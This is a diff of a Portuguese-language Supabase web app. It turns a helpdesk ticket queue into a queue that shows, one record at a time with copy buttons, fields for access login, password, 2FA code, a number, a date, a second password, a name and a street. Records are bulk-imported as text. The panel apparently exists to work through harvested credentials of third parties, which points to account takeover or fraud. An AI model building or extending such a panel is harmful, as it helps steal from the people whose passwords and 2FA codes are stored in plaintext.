@@ -47,11 +47,9 @@ function copiarTexto(texto) {
 
 // ----- Caches em memória (carregados do Supabase) -----
 let cacheChamados = [];
-let cacheClientes = [];
 let cacheUsuarios = [];
 
 function getChamados() { return cacheChamados; }
-function getClientes() { return cacheClientes; }
 function getUsuarios() { return cacheUsuarios; }
 function chamadosPorStatus(s) { return cacheChamados.filter(c => c.status === s); }
 
@@ -60,18 +58,13 @@ async function recarregarChamados() {
     if (!error && data) cacheChamados = data;
     return !error;
 }
-async function recarregarClientes() {
-    const { data, error } = await sb.from("clientes").select("*").order("nome", { ascending: true });
-    if (!error && data) cacheClientes = data;
-    return !error;
-}
 async function recarregarUsuarios() {
     const { data, error } = await sb.from("usuarios").select("*");
     if (!error && data) cacheUsuarios = data;
     return !error;
 }
 async function carregarTudo() {
-    await Promise.all([recarregarChamados(), recarregarClientes(), recarregarUsuarios()]);
+    await Promise.all([recarregarChamados(), recarregarUsuarios()]);
 }
 
 // ============================================================
@@ -94,29 +87,32 @@ function carregarFila() {
     const abertos = chamadosPorStatus("aberto");
     if (abertos.length > 0) {
         chamadoAtual = abertos[0];
-        setText("fTitulo", chamadoAtual.titulo);
-        setText("fDescricao", chamadoAtual.descricao || "—");
-        setText("fCliente", chamadoAtual.cliente || "—");
-        const prio = $("fPrioridade");
-        prio.textContent = chamadoAtual.prioridade || "—";
-        prio.className = "value " + prioClasse(chamadoAtual.prioridade);
+        setText("fAcesso", chamadoAtual.acesso || "—");
+        setText("fSenha", chamadoAtual.senha || "—");
+        setText("f2fa", chamadoAtual.dois_fa || "—");
+        setText("fNumero", chamadoAtual.numero || "—");
+        setText("fData", chamadoAtual.data || "—");
+        setText("fSenhaBranca", chamadoAtual.senha_branca || "—");
+        setText("fNome", chamadoAtual.nome || "—");
+        setText("fRua", chamadoAtual.rua || "—");
     } else {
         chamadoAtual = null;
-        setText("fTitulo", "—");
-        setText("fDescricao", "—");
-        setText("fCliente", "—");
-        const prio = $("fPrioridade");
-        prio.textContent = "—";
-        prio.className = "value";
+        setText("fAcesso", "—");
+        setText("fSenha", "—");
+        setText("f2fa", "—");
+        setText("fNumero", "—");
+        setText("fData", "—");
+        setText("fSenhaBranca", "—");
+        setText("fNome", "—");
+        setText("fRua", "—");
     }
     atualizarBotoesFila();
 }
 
 function atualizarBotoesFila() {
     const semFila = !chamadoAtual;
-    const cc = $("concluir"), nr = $("naoResolvido");
-    if (cc) { cc.disabled = semFila; cc.textContent = semFila ? "Sem chamados na fila" : "Concluir chamado"; }
-    if (nr) nr.disabled = semFila;
+    const cc = $("concluir");
+    if (cc) { cc.disabled = semFila; cc.textContent = semFila ? "Pronta" : "Concluir chamado"; }
 }
 
 async function mudarStatusChamado(id, status) {
@@ -131,12 +127,6 @@ async function concluirChamado() {
     if (!chamadoAtual) return;
     await mudarStatusChamado(chamadoAtual.id, "concluido");
     mostrarToast("Chamado concluído");
-}
-async function naoResolvidoChamado() {
-    if (!chamadoAtual) return;
-    if (!confirm("Marcar este chamado como não resolvido (cancelado)?")) return;
-    await mudarStatusChamado(chamadoAtual.id, "cancelado");
-    mostrarToast("Chamado cancelado");
 }
 
 function atualizarStatsChamados() {
@@ -242,72 +232,6 @@ async function importarChamados(texto) {
 }
 
 // ============================================================
-// Clientes
-// ============================================================
-function renderClientes() {
-    const ul = $("listaClientes");
-    const cs = getClientes();
-    ul.innerHTML = "";
-    setText("stClientes", String(cs.length));
-    if (cs.length === 0) {
-        const v = document.createElement("li");
-        v.className = "conta-empty";
-        v.textContent = "Nenhum cliente cadastrado.";
-        ul.appendChild(v);
-        return;
-    }
-    cs.forEach(c => {
-        const li = document.createElement("li");
-        li.className = "conta-item";
-        const info = document.createElement("div");
-        info.className = "conta-info";
-        const nome = document.createElement("span");
-        nome.className = "conta-email";
-        nome.textContent = c.nome;
-        const sub = document.createElement("span");
-        sub.className = "conta-senha";
-        sub.textContent = [c.email, c.telefone, c.endereco].filter(Boolean).join(" · ") || "—";
-        info.appendChild(nome);
-        info.appendChild(sub);
-        li.appendChild(info);
-        li.appendChild(botao("del-btn", "remover", () => removerCliente(c.id)));
-        ul.appendChild(li);
-    });
-}
-
-async function salvarCliente(cliente) {
-    const { error } = await sb.from("clientes").insert(cliente);
-    if (error) { mostrarToast("Erro ao salvar cliente"); return false; }
-    await recarregarClientes();
-    return true;
-}
-async function removerCliente(id) {
-    const { error } = await sb.from("clientes").delete().eq("id", id);
-    if (error) { mostrarToast("Erro ao remover"); return; }
-    await recarregarClientes();
-    renderClientes();
-}
-
-async function buscarCepCliente() {
-    const cep = ($("clCep").value || "").replace(/\D/g, "");
-    if (cep.length !== 8) { mostrarToast("CEP deve ter 8 dígitos"); return; }
-    const btn = $("buscarCep");
-    btn.disabled = true;
-    try {
-        const resp = await fetch("https://viacep.com.br/ws/" + cep + "/json/");
-        const d = await resp.json();
-        if (d.erro) { mostrarToast("CEP não encontrado"); return; }
-        const partes = [d.logradouro, d.bairro, d.localidade && (d.localidade + (d.uf ? "/" + d.uf : ""))].filter(Boolean);
-        $("clEndereco").value = partes.join(", ");
-        mostrarToast("Endereço preenchido");
-    } catch (e) {
-        mostrarToast("Falha ao buscar o CEP");
-    } finally {
-        btn.disabled = false;
-    }
-}
-
-// ============================================================
 // Usuários e login
 // ============================================================
 const USUARIOS_PADRAO = [
@@ -374,7 +298,6 @@ function ehAdmin() { return sessionStorage.getItem("cc_admin") === "1"; }
 function aplicarPermissoes() {
     const adm = ehAdmin();
     $("tabChamados").classList.toggle("hidden", !adm);
-    $("tabClientes").classList.toggle("hidden", !adm);
     $("tabUsuarios").classList.toggle("hidden", !adm);
 }
 
@@ -396,17 +319,15 @@ function mostrarSubChamados(sub) {
 }
 
 function mostrarAba(view) {
-    if ((view === "chamados" || view === "clientes" || view === "usuarios") && !ehAdmin()) view = "fila";
+    if ((view === "chamados" || view === "usuarios") && !ehAdmin()) view = "fila";
     document.querySelectorAll(".nav-item").forEach(t => {
         t.classList.toggle("active", t.getAttribute("data-view") === view);
     });
     $("viewFila").classList.toggle("hidden", view !== "fila");
     $("viewChamados").classList.toggle("hidden", view !== "chamados");
-    $("viewClientes").classList.toggle("hidden", view !== "clientes");
     $("viewUsuarios").classList.toggle("hidden", view !== "usuarios");
     if (view === "fila") carregarFila();
     if (view === "chamados") mostrarSubChamados("abertos");
-    if (view === "clientes") renderClientes();
     if (view === "usuarios") renderUsuarios();
 }
 
@@ -465,7 +386,6 @@ document.querySelectorAll(".subtab-btn").forEach(b => {
 });
 
 $("concluir").addEventListener("click", concluirChamado);
-$("naoResolvido").addEventListener("click", naoResolvidoChamado);
 
 document.querySelectorAll(".copy-btn").forEach(btn => {
     btn.addEventListener("click", () => {
@@ -510,37 +430,6 @@ $("limparAbertos").addEventListener("click", async () => {
     renderTudoChamados();
     carregarFila();
     mostrarToast("Chamados abertos removidos");
-});
-
-$("buscarCep").addEventListener("click", buscarCepCliente);
-
-$("formCliente").addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const nome = $("clNome").value.trim();
-    if (!nome) return;
-    const ok = await salvarCliente({
-        nome: nome,
-        email: $("clEmail").value.trim(),
-        telefone: $("clTelefone").value.trim(),
-        cep: $("clCep").value.trim(),
-        endereco: $("clEndereco").value.trim()
-    });
-    if (!ok) return;
-    e.target.reset();
-    $("clNome").focus();
-    renderClientes();
-    mostrarToast("Cliente salvo");
-});
-
-$("limparClientes").addEventListener("click", async () => {
-    if (getClientes().length === 0) return;
-    if (!confirm("Remover todos os clientes?")) return;
-    const ids = getClientes().map(c => c.id);
-    const { error } = await sb.from("clientes").delete().in("id", ids);
-    if (error) { mostrarToast("Erro ao limpar"); return; }
-    await recarregarClientes();
-    renderClientes();
-    mostrarToast("Clientes removidos");
 });
 
 $("formUsuario").addEventListener("submit", async (e) => {
